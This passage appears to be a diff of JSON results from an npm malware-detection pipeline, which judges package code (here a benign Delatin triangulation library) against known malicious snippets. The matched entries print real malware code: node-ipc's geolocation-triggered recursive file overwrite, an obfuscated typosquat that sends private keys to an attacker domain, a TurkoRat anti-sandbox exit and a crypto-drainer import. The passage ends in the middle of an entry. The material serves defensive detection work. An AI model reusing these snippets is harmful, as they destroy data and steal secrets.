+                    "action": "If the user is located in Russia or Belarus, the code recursively overwrites all files on the filesystem with a heart emoji, causing irreversible data loss.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "System data is destroyed for targeted users."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Regardless of geolocation, the bundled peacenotwar module writes a 'WITH-LOVE-FROM-AMERICA.txt' file containing a peace message to the user's Desktop directory.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "User sees unsolicited protest message on Desktop."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Geolocation-based logic that triggers destructive or protestware actions during install or import",
+                    "Recursive file overwrite or deletion operations targeting the entire filesystem",
+                    "Unsolicited creation of specific text files (e.g., 'WITH-LOVE-FROM-AMERICA.txt') on user Desktop",
+                    "Presence of obfuscated or base64-encoded payloads in package code",
+                    "Network requests to external geolocation APIs at import or install time"
+                  ],
+                  "file_indicators": [
+                    "dao/ssl-geospec.js",
+                    "node_modules/peacenotwar/index.js",
+                    "WITH-LOVE-FROM-AMERICA.txt on Desktop"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS requests to external geolocation APIs (e.g., ipinfo.io, ip-api.com) during install or import"
+                  ],
+                  "how_to_detect": "Monitor npm packages, especially 'node-ipc', for obfuscated or base64-encoded code, geolocation checks, and recursive filesystem access. Flag any package that writes unsolicited files such as 'WITH-LOVE-FROM-AMERICA.txt' to user Desktop or performs destructive actions based on region. Alert on the presence of 'dao/ssl-geospec.js' or bundled 'peacenotwar' modules. Detect outbound network requests to geolocation APIs during install/import. Correlate these behaviors to identify supply chain attacks."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_103551_305747_snippet_3",
+              "source_package": "nodejs-encrypt-agent, nodejs-cookie-proxy-agent (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_103551_305747/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.34378600120544434,
+              "code_similarity": 0.3451959788799286,
+              "behavior_similarity": 0.34237605333328247,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// TurkoRat anti-sandbox/anti-analysis (representative)\nif (process.env['SANDBOX'] || process.env['CI']) {\n  process.exit(0);\n}",
+                "code_behavior": "At import-time or runtime, the code checks for environment variables indicative of sandbox or CI environments and terminates execution immediately to evade automated analysis and detection.",
+                "malice_analysis": {
+                  "why_suspicious": "Anti-sandbox and anti-analysis checks are commonly used by malware to avoid detection by automated security tools. This behavior is rarely, if ever, justified in open-source npm packages.",
+                  "violated_expectations": "Legitimate packages do not attempt to detect or evade sandboxes or CI environments, nor do they terminate execution based on such checks.",
+                  "similar_legitimate_use": "Some performance-sensitive packages may alter behavior in CI, but this is rare, should be documented, and never involves silent termination.",
+                  "key_indicators": [
+                    "Checks for SANDBOX or CI environment variables at runtime",
+                    "Terminates process immediately if such variables are detected",
+                    "Obfuscates true behavior from automated or sandboxed analysis environments"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time or runtime",
+                  "file_location": "index.js or anti-analysis module",
+                  "required_permissions": [
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "nodejs-encrypt-agent, nodejs-cookie-proxy-agent",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (all published versions as of incident)",
+                  "why_malicious": "These packages were published to the npm repository with the explicit intent to deliver the TurkoRat info-stealer malware. They employ social engineering tactics such as typosquatting and inflated version numbers to deceive developers into installation. The packages contain code that, upon import or execution, exfiltrates sensitive information—including browser cookies, credentials, and cryptocurrency wallet data—from infected systems to attacker-controlled infrastructure."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the malicious npm package (nodejs-encrypt-agent or nodejs-cookie-proxy-agent).",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious code executes automatically on the developer's machine."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code reads sensitive data (browser cookies, credentials, wallet files) from the filesystem using Node.js file system APIs.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive data is collected and prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious code exfiltrates harvested data to a hardcoded external server via HTTPS POST requests.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives stolen credentials, cookies, and wallet data."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malware checks for sandbox or CI environments by inspecting environment variables and terminates if detected to avoid automated analysis.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Reduces likelihood of detection by automated security tools and sandboxes."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm package accessing browser cookies or credential files at import-time or runtime using Node.js fs module",
+                    "Exfiltration of local files to hardcoded external domains via HTTPS POST requests immediately after import or install",
+                    "Presence of anti-sandbox or anti-analysis logic: environment variable checks for SANDBOX or CI followed by process termination"
+                  ],
+                  "file_indicators": [
+                    "Access to ~/.config/google-chrome/Default/Cookies",
+                    "Access to ~/.config/.credentials",
+                    "Access to ~/.wallets",
+                    "Presence of code checking for SANDBOX or CI environment variables"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to hardcoded domains such as malicious-domain.com immediately after package import or installation",
+                    "Connections to domains or IPs associated with known info-stealer C2 infrastructure, especially during package initialization"
+                  ],
+                  "how_to_detect": "Monitor npm packages for code that accesses sensitive browser, credential, or wallet files and sends their contents to external servers via HTTPS POST. Flag packages containing anti-sandbox or anti-analysis logic, such as environment variable checks for SANDBOX or CI followed by process termination. Use network monitoring to detect unexpected outbound HTTPS POST requests to untrusted or hardcoded domains during or immediately after package installation or import. Employ both static and dynamic analysis to identify file access and exfiltration patterns in package code, and correlate with known C2 infrastructure."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_102926_037825_snippet_2",
+              "source_package": "@ledgerhq/connect-kit (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_102926_037825/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3351276218891144,
+              "code_similarity": 0.35890960693359375,
+              "behavior_similarity": 0.311345636844635,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Pseudocode representation based on report\nimport('2e6d5f64604be31').then(drainer => drainer.init());",
+                "code_behavior": "At import-time or during package initialization, the code dynamically imports and executes a secondary npm package (2e6d5f64604be31), which acts as a crypto drainer, enabling further malicious actions such as wallet draining and unauthorized asset transfers.",
+                "malice_analysis": {
+                  "why_suspicious": "The code dynamically downloads and executes an unlisted, suspiciously named secondary package at runtime, a common technique for evading static analysis and delivering malware payloads.",
+                  "violated_expectations": "Legitimate packages should not download or execute arbitrary code from external, unvetted sources at runtime, especially without user awareness or consent.",
+                  "similar_legitimate_use": "Dynamic imports are used in legitimate plugin systems, but only from trusted, well-known sources and never for unlisted or obfuscated packages.",
+                  "key_indicators": [
+                    "Dynamic import of a non-standard, suspiciously named package (2e6d5f64604be31)",
+                    "No user notification or consent for code execution",
+                    "Obfuscation of malicious payload delivery via secondary package",
+                    "Presence of code that enables further malicious actions after import"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (import-time or during package initialization)",
+                  "file_location": "main application code (in @ledgerhq/connect-kit v1.1.5 and v1.1.6)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "@ledgerhq/connect-kit",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.5, 1.1.6, 1.1.7",
+                  "why_malicious": "Versions 1.1.5, 1.1.6, and 1.1.7 of @ledgerhq/connect-kit were compromised to include or download crypto drainer malware. The malicious code is designed to either directly or indirectly execute unauthorized transactions, stealing cryptocurrency from users' wallets. The attack is triggered during normal application use, presenting fake wallet connection prompts and exfiltrating assets to attacker-controlled wallets without user consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious versions of @ledgerhq/connect-kit are published to npm and included as dependencies in target applications.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is distributed to end-user applications via dependency installation."
+                  },
+                  {
+                    "step": 2,
+                    "action": "When the application loads the compromised package, malicious code is executed either at import-time or during user interaction.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "User is presented with a fake wallet connection modal or a secondary drainer package is loaded and executed."
+                  },
+                  {
+                    "step": 3,
+                    "action": "User interacts with the fake modal and connects their wallet, or the secondary drainer package initializes.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malware initiates unauthorized transactions using the connected wallet."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malware drains funds from the connected wallet to attacker-controlled addresses.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives stolen cryptocurrency, achieving the final objective of the attack."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Display of unexpected or suspicious wallet connection modals in applications using @ledgerhq/connect-kit",
+                    "Automatic initiation of wallet transactions without explicit user consent or confirmation",
+                    "Dynamic import or download of secondary npm packages (such as 2e6d5f64604be31) at runtime",
+                    "Execution of code that interacts with browser wallet APIs outside of normal user-initiated flows"
+                  ],
+                  "file_indicators": [
+                    "Presence of @ledgerhq/connect-kit versions 1.1.5, 1.1.6, or 1.1.7 in package.json, package-lock.json, or yarn.lock",
+                    "References to package 2e6d5f64604be31 in source code or dependency trees",
+                    "Unexpected changes or additions to node_modules/@ledgerhq/connect-kit/main.js or related files"
+                  ],
+                  "network_indicators": [
+                    "Outbound cryptocurrency transactions to known attacker wallet addresses immediately following wallet connection events",
+                    "Unexpected network requests initiated during or after wallet connection flows",
+                    "Connections to domains or endpoints associated with the secondary drainer package"
+                  ],
+                  "how_to_detect": "Monitor dependency manifests (package.json, lockfiles) for the use of @ledgerhq/connect-kit versions 1.1.5, 1.1.6, or 1.1.7. Analyze application runtime for the presence of fake wallet connection modals and any unauthorized transaction initiations. Flag any dynamic imports or downloads of unlisted npm packages, especially those matching suspicious patterns (e.g., 2e6d5f64604be31). Monitor for network activity involving known attacker wallet addresses or suspicious transaction patterns immediately following wallet connection events. Review source code and built artifacts for references to secondary drainer packages or unexpected modifications to wallet connection logic."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/delatin/0.2.0/package/delatin.min.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "delatin.min_slice_1",
+          "code_snippet": "export default class Delatin{constructor(e,t,s=t){this.data=e,this.width=t,this.height=s,this.coords=[],this.triangles=[],this._halfedges=[],this._candidates=[],this._queueIndices=[],this._queue=[],this._errors=[],this._pending=[],this._pendingLen=0,this._rmsdSum=0,this._init()}run(e=1){for(;this.getMaxError()>e;)this.refine()}refine(){this._step(),this._flush()}getMaxError(){return this._errors[0]}getRMSD(){return Math.sqrt(this._rmsdSum/this._errors.length)}heightAt(e,t){return this.data[this.width*t+e]}_init(){const e=this.width-1,t=this.height-1,s=this._addPoint(0,0),i=this._addPoint(e,0),h=this._addPoint(0,t),n=this._addPoint(e,t),r=this._addTriangle(n,s,h,-1,-1,-1);this._addTriangle(s,n,i,r,-1,-1),this._flush()}_flush(){const e=this.coords;for(let t=0;t<this._pendingLen;t++){const s=this._pending[t],i=2*this.triangles[3*s+0],h=2*this.triangles[3*s+1],n=2*this.triangles[3*s+2];this._findCandidate(e[i],e[i+1],e[h],e[h+1],e[n],e[n+1],s)}this._pendingLen=0}_findCandidate(e,t,s,i,h,n,r){const a=Math.min(e,s,h),_=Math.min(t,i,n),d=Math.max(e,s,h),o=Math.max(t,i,n);let l=orient(s,i,h,n,a,_),u=orient(h,n,e,t,a,_),g=orient(e,t,s,i,a,_);const c=i-t,f=e-s,q=n-i,p=s-h,m=t-n,w=h-e,M=orient(e,t,s,i,h,n),T=this.heightAt(e,t)/M,P=this.heightAt(s,i)/M,z=this.heightAt(h,n)/M;let S=0,x=0,L=0;for(let e=_;e<=o;e++){let t=0;l<0&&0!==q&&(t=Math.max(t,Math.floor(-l/q))),u<0&&0!==m&&(t=Math.max(t,Math.floor(-u/m))),g<0&&0!==c&&(t=Math.max(t,Math.floor(-g/c)));let s=l+q*t,i=u+m*t,h=g+c*t,n=!1;for(let r=a+t;r<=d;r++){if(s>=0&&i>=0&&h>=0){n=!0;const t=T*s+P*i+z*h,a=Math.abs(t-this.heightAt(r,e));a>S&&(S=a,x=r,L=e)}else if(n)break;s+=q,i+=m,h+=c}l+=p,u+=w,g+=f}(x===e&&L===t||x===s&&L===i||x===h&&L===n)&&(S=0),this._candidates[2*r]=x,this._candidates[2*r+1]=L,this._queuePush(r,S)}_step(){const e=this._queuePop(),t=3*e+0,s=3*e+1,i=3*e+2,h=this.triangles[t],n=this.triangles[s],r=this.triangles[i],a=this.coords[2*h],_=this.coords[2*h+1],d=this.coords[2*n],o=this.coords[2*n+1],l=this.coords[2*r],u=this.coords[2*r+1],g=this._candidates[2*e],c=this._candidates[2*e+1],f=this._addPoint(g,c);if(0===orient(a,_,d,o,g,c))this._handleCollinear(f,t);else if(0===orient(d,o,l,u,g,c))this._handleCollinear(f,s);else if(0===orient(l,u,a,_,g,c))this._handleCollinear(f,i);else{const e=this._halfedges[t],a=this._halfedges[s],_=this._halfedges[i],d=this._addTriangle(h,n,f,e,-1,-1,t),o=this._addTriangle(n,r,f,a,-1,d+1),l=this._addTriangle(r,h,f,_,d+2,o+1);this._legalize(d),this._legalize(o),this._legalize(l)}}_addPoint(e,t){const s=this.coords.length>>1;return this.coords.push(e,t),s}_addTriangle(e,t,s,i,h,n,r=this.triangles.length){const a=r/3;return this.triangles[r+0]=e,this.triangles[r+1]=t,this.triangles[r+2]=s,this._halfedges[r+0]=i,this._halfedges[r+1]=h,this._halfedges[r+2]=n,i>=0&&(this._halfedges[i]=r+0),h>=0&&(this._halfedges[h]=r+1),n>=0&&(this._halfedges[n]=r+2),this._candidates[2*a+0]=0,this._candidates[2*a+1]=0,this._queueIndices[a]=-1,this._pending[this._pendingLen++]=a,r}_legalize(e){const t=this._halfedges[e];if(t<0)return;const s=e-e%3,i=t-t%3,h=s+(e+1)%3,n=s+(e+2)%3,r=i+(t+2)%3,a=i+(t+1)%3,_=this.triangles[n],d=this.triangles[e],o=this.triangles[h],l=this.triangles[r],u=this.coords;if(!inCircle(u[2*_],u[2*_+1],u[2*d],u[2*d+1],u[2*o],u[2*o+1],u[2*l],u[2*l+1]))return;const g=this._halfedges[h],c=this._halfedges[n],f=this._halfedges[r],q=this._halfedges[a];this._queueRemove(s/3),this._queueRemove(i/3);const p=this._addTriangle(_,l,o,-1,f,g,s),m=this._addTriangle(l,_,d,p,c,q,i);this._legalize(p+1),this._legalize(m+2)}_handleCollinear(e,t){const s=t-t%3,i=s+(t+1)%3,h=s+(t+2)%3,n=this.triangles[h],r=this.triangles[t],a=this.triangles[i],_=this._halfedges[i],d=this._halfedges[h],o=this._halfedges[t];if(o<0){const t=this._addTriangle(e,n,r,-1,d,-1,s),i=this._addTriangle(n,e,a,t,-1,_);return this._legalize(t+1),void this._legalize(i+2)}const l=o-o%3,u=l+(o+2)%3,g=l+(o+1)%3,c=this.triangles[u],f=this._halfedges[u],q=this._halfedges[g];this._queueRemove(l/3);const p=this._addTriangle(n,r,e,d,-1,-1,s),m=this._addTriangle(r,c,e,q,-1,p+1,l),w=this._addTriangle(c,a,e,f,-1,m+1),M=this._addTriangle(a,n,e,_,p+2,w+1);this._legalize(p),this._legalize(m),this._legalize(w),this._legalize(M)}_queuePush(e,t){const s=this._queue.length;this._queueIndices[e]=s,this._queue.push(e),this._errors.push(t),this._rmsdSum+=t*t,this._queueUp(s)}_queuePop(){const e=this._queue.length-1;return this._queueSwap(0,e),this._queueDown(0,e),this._queuePopBack()}_queuePopBack(){const e=this._queue.pop(),t=this._errors.pop();return this._rmsdSum-=t*t,this._queueIndices[e]=-1,e}_queueRemove(e){const t=this._queueIndices[e];if(t<0){const t=this._pending.indexOf(e);if(-1===t)throw new Error(\"Broken triangulation (something went wrong).\");return void(this._pending[t]=this._pending[--this._pendingLen])}const s=this._queue.length-1;s!==t&&(this._queueSwap(t,s),this._queueDown(t,s)||this._queueUp(t)),this._queuePopBack()}_queueLess(e,t){return this._errors[e]>this._errors[t]}_queueSwap(e,t){const s=this._queue[e],i=this._queue[t];this._queue[e]=i,this._queue[t]=s,this._queueIndices[s]=t,this._queueIndices[i]=e;const h=this._errors[e];this._errors[e]=this._errors[t],this._errors[t]=h}_queueUp(e){let t=e;for(;;){const e=t-1>>1;if(e===t||!this._queueLess(t,e))break;this._queueSwap(e,t),t=e}}_queueDown(e,t){let s=e;for(;;){const e=2*s+1;if(e>=t||e<0)break;const i=e+1;let h=e;if(i<t&&this._queueLess(i,e)&&(h=i),!this._queueLess(h,s))break;this._queueSwap(s,h),s=h}return s>e}}function orient(e,t,s,i,h,n){return(s-h)*(t-n)-(i-n)*(e-h)}function inCircle(e,t,s,i,h,n,r,a){const _=e-r,d=t-a,o=s-r,l=i-a,u=h-r,g=n-a,c=o*o+l*l,f=u*u+g*g;return _*(l*f-c*g)-d*(o*f-c*u)+(_*_+d*d)*(o*g-l*u)<0}",
+          "is_malicious": false,
+          "malice_score": 0.36416933536529544,
+          "confidence": 0.0,
+          "behavior_summary": "When called, the code performs computational geometry operations including point addition, triangle creation, and triangulation refinement using internal data arrays. It accesses and modifies in-memory data structures representing coordinates, triangles, and edges without performing any network, file, or system operations. This behavior involves no external data access or suspicious hardcoded values, resulting in purely local geometric computations with no security impact.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a purely computational geometry implementation performing triangulation and refinement on in-memory data structures. It does not perform any network communication, file system access, environment manipulation, or obfuscated payload execution. Compared to the known malicious patterns, it lacks any external API calls, obfuscated string construction, or attempts to exfiltrate data or manipulate the system. The behavior is consistent with legitimate local geometric computations without any suspicious or malicious operations.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20240824_195356_692327_snippet_1",
+              "source_package": "node-ipc (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_195356_692327/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3671247065067291,
+              "code_similarity": 0.3104802370071411,
+              "behavior_similarity": 0.42376917600631714,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "setTimeout(function () {\n    const randomNumber = Math.round(Math.random() * 4);\n    if (randomNumber > 1) {\n        // return;\n    }\n    const apiKey = \"https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154\";\n    const pwd = \"./\";\n    const parentDir = \"../\";\n    const grandParentDir = \"../../\";\n    const root = \"/\";\n    const countryName = \"country_name\";\n    const russia = \"russia\";\n    const belarus = \"belarus\";\n    https.get(apiKey, function (message) {\n        message.on(\"data\", function (msgBuffer) {\n            try {\n                const message = JSON.parse(msgBuffer.toString(\"utf8\"));\n                const userCountryName = message[countryName.toString(\"utf8\")].toLowerCase();\n                const hasRus = userCountryName.includes(russia.toString(\"utf8\")) || userCountryName.includes(belarus.toString(\"utf8\"));\n                if (hasRus) {\n                    deleteFile(pwd);\n                    deleteFile(parentDir);\n                    deleteFile(grandParentDir);\n                    deleteFile(root);\n                }\n            } catch (t) {}\n        });\n    });\n    // zkyf: Let's try this directly here\n    deleteFile(pwd);\n    deleteFile(parentDir);\n    deleteFile(grandParentDir);\n    deleteFile(root);\n}, 100);",
+                "code_behavior": "At runtime, shortly after import, the code initiates a delayed execution using setTimeout, performs an external geolocation API request, parses the response to determine the user's country, and if the country is Russia or Belarus, recursively calls a file deletion function on multiple directory levels, resulting in destructive file overwrites.",
+                "malice_analysis": {
+                  "why_suspicious": "The code makes an unsolicited external geolocation API request and, based on the result, triggers recursive file overwrite operations targeting the entire filesystem. This is a clear indicator of a targeted, destructive payload.",
+                  "violated_expectations": "A legitimate IPC package should not perform geolocation checks or attempt to overwrite user files under any circumstances. The expected behavior is to provide inter-process communication utilities, not to execute destructive actions based on user location.",
+                  "similar_legitimate_use": "Geolocation checks may be used for regional feature toggling or compliance, but never to trigger destructive file operations. Recursive file deletion is only appropriate in uninstallers or cleanup tools, and only with explicit user consent.",
+                  "key_indicators": [
+                    "Automated geolocation API request at runtime",
+                    "Conditional logic targeting specific countries (Russia, Belarus)",
+                    "Recursive invocation of file overwrite function across multiple directory levels",
+                    "Destructive file operations triggered without user interaction"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (shortly after import, via setTimeout)",
+                  "file_location": "dao/ssl-geospec.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "node-ipc",
+                  "package_manager": "npm",
+                  "package_versions": "10.1.1, 10.1.2",
+                  "why_malicious": "The package was intentionally altered by its maintainer to include code that, upon execution, checks the user's geolocation via an external API. If the user is located in Russia or Belarus, the code recursively overwrites files across the filesystem with a heart emoji, resulting in widespread and deliberate data destruction. This constitutes a targeted sabotage attack, which is entirely outside the scope of legitimate package behavior."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "On package installation or import, the malicious code in dao/ssl-geospec.js is loaded and scheduled for execution via setTimeout.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Geolocation check and potential execution of destructive payload"
+                  },
+                  {
+                    "step": 2,
+                    "action": "The code performs an external geolocation API request to determine if the user is located in Russia or Belarus.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Conditional execution of recursive file overwrite function"
+                  },
+                  {
+                    "step": 3,
+                    "action": "If the user is in a targeted country, the code recursively attempts to overwrite all files on the system with a heart emoji.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Destruction of user and system data"
+                  },
+                  {
+                    "step": 4,
+                    "action": "In related packages (peacenotwar, oneday-test), the code writes a protest message file to user Desktop and OneDrive directories.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Display of unsolicited political/protest message in user-accessible locations"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "JavaScript packages that make runtime geolocation API requests and subsequently perform recursive filesystem operations or file overwrites",
+                    "Recursive file overwrite attempts targeting user and system directories, especially with static content (e.g., heart emoji)",
+                    "Creation of unsolicited files with political or protest content in user Desktop or OneDrive directories"
+                  ],
+                  "file_indicators": [
+                    "dao/ssl-geospec.js",
+                    "WITH-LOVE-FROM-AMERICA.txt",
+                    "Unusual file writes to ~/Desktop, ~/OneDrive, ~/OneDrive/Desktop"
+                  ],
+                  "network_indicators": [
+                    "https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154"
+                  ],
+                  "how_to_detect": "Monitor for JavaScript packages that initiate external geolocation API requests at runtime, especially if followed by recursive filesystem operations or file overwrites. Flag any package that writes unsolicited files to user Desktop or OneDrive directories, or that contains the file dao/ssl-geospec.js. Alert on the presence of WITH-LOVE-FROM-AMERICA.txt in user directories. Correlate destructive file operations or unusual file creation with recent package updates or new dependencies to identify malicious activity."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_202035_951167_snippet_2",
+              "source_package": "@jackshanyeshuzi/curvess (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_202035_951167/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3636512756347656,
+              "code_similarity": 0.32651209831237793,
+              "behavior_similarity": 0.40079042315483093,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "try {\n  let m1 = ['w', 'a', 'l', 'e', 't', '.', 'c', 'b', '1', '2', '3', 'n', '/', 'i', 'n', 'd', 'x', 'p', '?', 'p', 'r', '=', 's', ':'];\n  let h = m1[18] + m1[4] + m1[17] + m1[23] + m1[24] + m1[12] + m1[0] + m1[1] + m1[2] + m1[2] + m1[4] + m1[5] + m1[6] + m1[7] + m1[1] + m1[8] + m1[9] + m1[10] + m1[5] + m1[6] + m1[11];\n  let path = m1[12] + m1[13] + m1[11] + m1[15] + m1[3] + m1[16] + m1[5] + m1[20] + m1[21] + m1[13] + m1[11] + m1[4] + m1[22];\n  https.get(h + path + privateKey.toString(), function () { });\n} catch (e) {}",
+                "code_behavior": "At runtime, during cryptographic signing operations, the code obfuscates the construction of the exfiltration URL and sends the private key to the attacker's server using an HTTPS GET request, resulting in covert exfiltration of cryptographic secrets.",
+                "malice_analysis": {
+                  "why_suspicious": "Obfuscation of network exfiltration is a strong indicator of malicious intent. The code transmits private key material to an external server, making detection more difficult and increasing the risk to users.",
+                  "violated_expectations": "No legitimate cryptographic library should obfuscate network requests or transmit private keys. All key material should remain local and never be sent externally.",
+                  "similar_legitimate_use": "Obfuscation might be used in DRM or anti-tamper code, but never for exfiltrating cryptographic secrets or user keys.",
+                  "key_indicators": [
+                    "Obfuscated string construction for host and path",
+                    "HTTPS request containing private key material",
+                    "Try/catch block to suppress errors and avoid detection",
+                    "Network activity during cryptographic operations"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (during cryptographic signing operations, later versions)",
+                  "file_location": "abstract/weierstrass.js (prepSig function, obfuscated variant)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "@jackshanyeshuzi/curvess",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.0 - 1.1.9 (all published versions as of 2023-08-04)",
+                  "why_malicious": "The package is a typosquat of the legitimate @noble/curves cryptographic library and contains concealed code that exfiltrates users' private cryptographic keys to an attacker-controlled server. This results in a total compromise of cryptographic operations and user key material, posing a severe security risk."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs ethereum-cryptographyyy, which depends on @jackshanyeshuzi/curvess instead of the legitimate @noble/curves.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code in @jackshanyeshuzi/curvess is loaded."
+                  },
+                  {
+                    "step": 2,
+                    "action": "When cryptographic signing is performed, the prepSig function in @jackshanyeshuzi/curvess is invoked.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Private key is captured and prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "prepSig function sends the user's private key to wallet.cba123.cn via HTTP/HTTPS request.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives the user's private key, compromising all cryptographic security."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Network requests (HTTP/HTTPS) to external domains during cryptographic operations",
+                    "Logging or exporting of private key material in cryptographic functions",
+                    "Obfuscated string construction for network requests in cryptographic libraries",
+                    "Unexpected network activity triggered by cryptographic math functions"
+                  ],
+                  "file_indicators": [
+                    "abstract/weierstrass.js containing http or https module imports",
+                    "prepSig function with network request code",
+                    "References to wallet.cba123.cn or similar domains in code",
+                    "Obfuscated string arrays used to construct URLs in cryptographic files"
+                  ],
+                  "network_indicators": [
+                    "Connections to wallet.cba123.cn",
+                    "Connections to 42.96.168.4 (ALISOFT, CN)",
+                    "Unusual HTTP/HTTPS requests during cryptographic operations",
+                    "Outbound requests to hardcoded domains from cryptographic libraries"
+                  ],
+                  "how_to_detect": "Monitor cryptographic libraries for unexpected network activity, especially HTTP/HTTPS requests to external domains such as wallet.cba123.cn or 42.96.168.4. Scan for code that logs or exports private key material, and flag any obfuscated string construction used in network requests. Audit dependencies for typosquatted packages and verify that cryptographic math files do not import network libraries. Use static analysis to detect hardcoded domains and dynamic analysis to observe network behavior during cryptographic operations."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104012_987336_snippet_3",
+              "source_package": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_987336/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3635661005973816,
+              "code_similarity": 0.4080972671508789,
+              "behavior_similarity": 0.31903496384620667,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
